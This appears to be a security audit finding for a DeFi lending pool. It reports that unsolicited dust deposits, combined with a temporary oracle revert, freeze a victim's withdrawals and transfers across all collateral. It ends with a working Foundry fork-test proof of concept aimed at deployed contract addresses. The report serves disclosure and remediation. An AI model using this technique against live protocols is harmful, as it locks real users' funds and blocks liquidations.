### Title
Unrequested collateral dust can freeze all withdrawals after a temporary oracle failure - (File: contracts/DepositToken.sol)

### Summary
An unprivileged attacker can add a registered collateral token to a victim's per-account collateral set by depositing or transferring a dust amount to the victim. `Pool.depositOf` later queries every registered collateral held by that account, so a temporary oracle revert for the dusted collateral makes `debtPositionOf` revert and consequently blocks the victim's `DepositToken.transfer` and `DepositToken.withdraw` calls across all collateral types until the oracle recovers.

### Finding Description
`DepositToken._mint` adds a deposit token to `Pool.depositTokensOfAccount` whenever an account receives its first nonzero balance, and `Pool.addToDepositTokensOfAccount` only verifies that the caller is a registered deposit token and that the account has not reached `MAX_TOKENS_PER_USER`. [1](#0-0) [2](#0-1) [3](#0-2) 

After the token is added, `Pool.depositOf` iterates over every collateral token associated with the account and calls `masterOracle.quoteTokenToUsd` for each token's underlying asset. [4](#0-3)  A revert from any one oracle therefore aborts the entire position calculation instead of being isolated to that collateral. [5](#0-4) 

Both `transfer` and `withdraw` call `_revertIfLocked`, which depends on `unlockedBalanceOf`, and `unlockedBalanceOf` unconditionally calls `Pool.debtPositionOf`. [6](#0-5) [7](#0-6) [8](#0-7)  The victim cannot remove the dusted token through `transfer` for the same reason, and only the deposit-token contract itself can remove the entry from the pool's account set. [9](#0-8) 

The attack sequence is to deposit or transfer a nonzero amount of a registered deposit token to the victim while its oracle is operational, then wait for that oracle to enter a temporary revert state such as price expiration or provider outage. [10](#0-9)  While the oracle remains unavailable, every call that needs `Pool.debtPositionOf` fails for the victim, including collateral withdrawals and liquidation health checks. [11](#0-10) 

### Impact Explanation
This causes a temporary freezing of user funds: the victim cannot transfer or withdraw any deposit tokens in the affected pool, including collateral unrelated to the dusted token, because every lock check evaluates the entire account-wide collateral set. [12](#0-11) [4](#0-3) 

For an account with debt, the same revert also prevents liquidation and normal position evaluation while the oracle is unavailable. [13](#0-12)  If the oracle failure persists, the temporary freeze can become a prolonged or effectively permanent freeze because the dusted entry cannot be removed through the normal balance-transfer path. [14](#0-13) 

### Likelihood Explanation
The attacker does not need a privileged role, forged token, or malicious pool because `Pool.addToDepositTokensOfAccount` accepts additions only from deposit tokens already registered by the pool. [15](#0-14)  The cost is limited to acquiring or depositing enough underlying to produce a nonzero deposit-token balance for the victim. [16](#0-15) 

The prerequisite is a temporary oracle quote failure for any registered collateral already planted in the victim's account set. [17](#0-16)  An attacker can pre-position dust across registered collaterals and wait for a scheduled pull-oracle expiration or another transient provider outage, making the condition operationally plausible even though it cannot be triggered while the relevant oracle remains healthy. [6](#0-5) 

### Recommendation
Add a safe escape path that lets an account burn or abandon a problematic deposit-token balance without evaluating the global `debtPositionOf`, thereby removing the token from `depositTokensOfAccount` while forfeiting only that token's underlying collateral. [18](#0-17) [9](#0-8) 

Also enforce an economically meaningful minimum first deposit or transfer before adding a new token to the per-account set, and consider isolating per-collateral oracle failures in account views where doing so cannot understate debt or overstate collateral. [2](#0-1) [4](#0-3) 

### Proof of Concept
The following Foundry fork test demonstrates the sequence using deployed contract addresses and a known future oracle-expiration timestamp supplied through the environment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositTokenLike is IERC20Like {
    function underlying() external view returns (IERC20Like);
    function deposit(uint256 amount, address onBehalfOf) external returns (uint256, uint256);
    function withdraw(uint256 amount, address to) external returns (uint256, uint256);
}

interface IPoolLike {
    function getDepositTokensOfAccount(address account) external view returns (address[] memory);
    function debtPositionOf(address account)
        external
        view
        returns (bool, uint256, uint256, uint256, uint256);
}

contract CollateralDustOracleDoS is Test {
    IPoolLike pool = IPoolLike(vm.envAddress("POOL"));

    // A registered deposit token whose oracle will revert after expiry.
    IDepositTokenLike staleCollateral =
        IDepositTokenLike(vm.envAddress("STALE_DEPOSIT_TOKEN"));

    // A different registered deposit token already held by the victim.
    IDepositTokenLike victimCollateral =
        IDepositTokenLike(vm.envAddress("VICTIM_DEPOSIT_TOKEN"));

    address attacker = makeAddr("attacker");
    address victim = vm.envAddress("VICTIM");

    function testDustCollateralThenOracleExpiryFreezesWithdrawals() external {
        uint256 expiry = vm.envUint("ORACLE_EXPIRY_TIMESTAMP");
        uint256 seedAmount = vm.envUint("SEED_UNDERLYING_AMOUNT");

        vm.warp(expiry - 1);

        IERC20Like underlying = staleCollateral.underlying();
        deal(address(underlying), attacker, seedAmount);

        vm.startPrank(attacker);
        underlying.approve(address(staleCollateral), seedAmount);

        // Mints dust directly to the victim and inserts staleCollateral into
        // pool.depositTokensOfAccount(victim) without victim consent.
        staleCollateral.deposit(seedAmount, victim);
        vm.stopPrank();

        address[] memory tokens = pool.getDepositTokensOfAccount(victim);
        bool inserted;
        for (uint256 i; i < tokens.length; ++i) {
            inserted = inserted || tokens[i] == address(staleCollateral);
        }
        assertTrue(inserted);

        // Move past the point at which staleCollateral's oracle starts reverting.
        vm.warp(expiry + 1);

        // Global position accounting is poisoned by the dusted collateral.
        vm.expectRevert();
        pool.debtPositionOf(victim);

        // The victim cannot remove the dusted token to clear the poisoned entry.
        vm.prank(victim);
        vm.expectRevert();
        staleCollateral.transfer(attacker, 1);

        // Unrelated collateral held by the same victim is also frozen.
        uint256 victimBalance = victimCollateral.balanceOf(victim);
        assertGt(victimBalance, 0);

        vm.prank(victim);
        vm.expectRevert();
        victimCollateral.withdraw(1, victim);
    }
}
```
